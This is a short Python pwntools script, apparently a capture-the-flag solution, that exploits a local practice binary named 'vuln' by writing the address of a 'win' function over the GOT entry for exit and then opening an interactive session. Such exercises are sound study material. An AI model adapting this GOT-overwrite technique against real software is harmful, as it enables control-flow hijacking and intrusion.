#!/usr/bin/env python3
from pwn import *

context(arch='x86', terminal=['tmux', 'neww'])
r = process('./vuln')
e = ELF('./vuln')

exit_got = e.got['exit']
win = e.symbols['win']

print(f"exit GOT address: {exit_got}")
print(f"win address: {win}")

r.recvuntil("Input address")
r.sendline(str(exit_got))
r.sendline(str(win))
r.interactive()
